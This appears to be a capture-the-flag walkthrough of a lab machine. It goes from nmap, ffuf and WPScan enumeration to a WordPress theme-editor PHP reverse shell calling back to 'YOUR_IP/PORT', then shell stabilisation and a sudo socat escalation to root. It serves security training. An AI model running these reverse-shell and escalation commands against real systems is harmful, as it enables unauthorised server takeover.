## Reconnaissance Phase

We begin with the **reconnaissance phase**, a critical stage in any security assessment or penetration test. During this phase, the primary objective is to **collect information** about the target system or infrastructure. This information can provide valuable insights that help us **identify potential attack vectors**.

---

## Port Scanning

At this stage, we proceed to **enumerate the target machine using `nmap`**, with the goal of identifying **open ports** that could potentially serve as **entry points** into the system.

```ruby
nmap -p- --open -Pn -n -T5 -sS <Target-IP> -vvv
```

<img src="/budahacksecurity_static/uploads/md_images/all/all.png" style="max-width:100%; border-radius:8px;">

---

## Detected Open Ports

After completing the port scan, **three open ports** were identified on the target machine. This finding is important, as each open port represents a service that may contain exploitable vulnerabilities or expose useful information.

Next, we proceed to **enumerate each port individually** in order to:

* **Identify the running service**
* Determine the **exact version**
* Look for **misconfigurations**, **known vulnerabilities**, or **backdoors**
* Gather information that may guide us during the **next attack phase**

```ruby
nmap -p80,22,21 -Pn -n --min-rate 5000 -sSVC <IP> -vvv -oN Scan
```

<img src="/budahacksecurity_static/uploads/md_images/all/all1.png" style="max-width:100%; border-radius:8px;">

---

## Nmap Script Enumeration Results (NSE)

By using Nmap NSE scripts (`-sC -sV`) during the scan, we gathered valuable details about the services running on the open ports.

---
🔹 Port 21 (FTP)

* **Service detected:** FTP
* **Version:** vsftpd 3.0.5
* **Observations:**
  The FTP server allows authentication using the **`anonymous`** user. This could potentially allow unauthenticated access, making it a promising attack vector worth further investigation to determine whether files can be listed, downloaded, or even uploaded.

---

 🔹 Port 22 (SSH)

* **Service detected:** SSH
* **Version:** OpenSSH 8.2p1 Ubuntu
* **Observations:**
  No unusual behavior was detected. The service appears properly configured and does not allow unauthenticated access or expose sensitive information.

---

🔹 Port 80 (HTTP)

* **Service detected:** HTTP (Web server)
* **Version:** Apache 2.4.41
* **Observations:**
  No abnormal behavior was observed during the initial inspection. The main page responds correctly. A deeper scan using tools such as `gobuster` or `nikto` is recommended to identify hidden routes, sensitive files, or web vulnerabilities.

---

## Enumeration of Port 21 (FTP)

After confirming that port **21** is open and running an **FTP** service, we attempted to connect using the **`anonymous`** user, since the server allows unauthenticated access.

```ruby
ftp <ip>
```

The connection was successful. However, after listing the contents of the FTP server using `ls`, we observed that:

* **The directory is empty**
* **No visible files or folders**
* **No write permissions available**

<img src="/budahacksecurity_static/uploads/md_images/all/all2.png" style="max-width:100%; border-radius:8px;">

---

## Enumeration of Port 80 (HTTP)

Accessing the target IP via a browser on **port 80** loads the **default Apache page**.

<img src="/budahacksecurity_static/uploads/md_images/all/all3.png" style="max-width:100%; border-radius:8px;">

---

 Web Fuzzing on Port 80 (HTTP)

Since the default Apache page is displayed and no visible website or routes are present, we decided to perform **web fuzzing** to discover hidden directories or files on the server.

For this task, we used **`ffuf` (Fuzz Faster U Fool)**, a fast and efficient tool for brute-forcing web paths.

```ruby
ffuf -ic -c -w /usr/share/wordlists/dirbuster/directory-list-2-3-lower-case-medium.txt:FUZZ -u http://10.10.219.250/FUZZ -mc 301,200
```

<img src="/budahacksecurity_static/uploads/md_images/all/all4.png" style="max-width:100%; border-radius:8px;">

---

 Web Fuzzing Results

As a result of the web fuzzing process, we discovered **two hidden directories** that were not accessible from the main page:

* `hackathons`
* `wordpress`

---

## Analysis of the `hackathons` Directory

Upon visiting the `hackathons` directory, we encountered the message:

> **“Damn how much I hate the smell of Vinegar”**

This message appears to be a **hint**.

<img src="/budahacksecurity_static/uploads/md_images/all/5.png" style="max-width:100%; border-radius:8px;">

After inspecting the page source, we found **two additional messages left by the directory creator**, one of which appeared to be an **encrypted password**.

<img src="/budahacksecurity_static/uploads/md_images/all/all6.png" style="max-width:100%; border-radius:8px;">

By applying **Vigenère (Vinegar) decoding** using the key **`KeepGoing`**, we successfully recovered the original plaintext.

This confirms that:

* **`KeepGoing` is the correct decryption key**

<img src="/budahacksecurity_static/uploads/md_images/all/all7.png" style="max-width:100%; border-radius:8px;">

---

## WordPress Enumeration

Navigating to the `/wordpress` directory confirmed that the application is running **WordPress**.

To continue enumeration, we used **WPScan**, a tool specifically designed to identify users, plugins, themes, and known vulnerabilities in WordPress installations.

WPScan Enumeration Goals

* Identify registered users (for brute-force or social engineering attacks)
* Detect vulnerable plugins
* Identify the WordPress version for exploit research

<img src="/budahacksecurity_static/uploads/md_images/all/all9.png" style="max-width:100%; border-radius:8px;">

```ruby
wpscan --url http://<IP>/wordpress --enumerate u,p
```

<img src="/budahacksecurity_static/uploads/md_images/all/all10.png" style="max-width:100%; border-radius:8px;">

We identified a **plugin vulnerable to LFI (Local File Inclusion)** and also discovered a valid **WordPress username: `elyana`**. This provides a strong foothold for exploitation.

---

## 2. Exploitation via Reverse Shell Upload

With a valid **username (`elyana`)** and **password**, we proceed to log in to the **WordPress admin panel**:

<img src="/budahacksecurity_static/uploads/md_images/all/all11.png" style="max-width:100%; border-radius:8px;">

Once inside:

1. Navigate to **Appearance → Themes**
2. Select an active theme (e.g., *Twenty Twenty-One*)
3. Open the **Theme File Editor**
4. Choose a PHP file that executes when visiting the site (e.g., `404.php`, `footer.php`, `functions.php`)
5. Paste a PHP reverse shell, such as:

```ruby
<?php
exec("/bin/bash -c 'bash -i >& /dev/tcp/YOUR_IP/PORT 0>&1'");
?>
```

On the attacker machine:

```ruby
nc -lvnp <port>
```

<img src="/budahacksecurity_static/uploads/md_images/all/all12.png" style="max-width:100%; border-radius:8px;">

---

## Shell Stabilization

Once the reverse shell is obtained, we upgrade it to a fully interactive shell:

```ruby
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

```ruby
export TERM=xterm
```

Suspend the shell with `Ctrl + Z`, then on the attacker machine:

```ruby
stty raw -echo
fg
```

You now have a **fully interactive shell**.

---

## 3. Post-Exploitation

After gaining initial access, we begin the **post-exploitation phase**, focusing on **system enumeration** and **privilege escalation**.

Inside `/home/elyana/`, we find a message indicating that **the user’s password is hidden somewhere on the system**.

<img src="/budahacksecurity_static/uploads/md_images/all/all13.png" style="max-width:100%; border-radius:8px;">

We search for files owned by `elyana`:

```ruby
find / -user elyana -type f 2>/dev/null
```

<img src="/budahacksecurity_static/uploads/md_images/all/all14.png" style="max-width:100%; border-radius:8px;">

We switch to the user:

```ruby
su elyana
password --> E@syR18ght
```

After logging in, we retrieve the first flag and check sudo permissions:

<img src="/budahacksecurity_static/uploads/md_images/all/all15.png" style="max-width:100%; border-radius:8px;">

---

## Privilege Escalation Using `socat`

During enumeration, we discovered that **`/usr/bin/socat`** is available and can be executed with **sudo privileges without a password**.

Using **GTFOBins**, we identify a reliable privilege escalation technique:

```ruby
sudo socat stdin exec:/bin/sh
```

<img src="/budahacksecurity_static/uploads/md_images/all/all16.png" style="max-width:100%; border-radius:8px;">

---

## Conclusion

We successfully achieved **root access**, completing all phases of the attack lifecycle: vulnerability discovery, exploitation, post-exploitation, and privilege escalation.

Although this machine may initially appear **easy**, it serves as an excellent platform for practicing essential ethical hacking techniques such as:

* LFI vulnerability detection
* User and permission analysis
* Privilege escalation using **GTFOBins**
* Reverse shell handling and stabilization

> These types of challenges prepare us for real-world scenarios, where success depends on observation, persistence, and creativity.
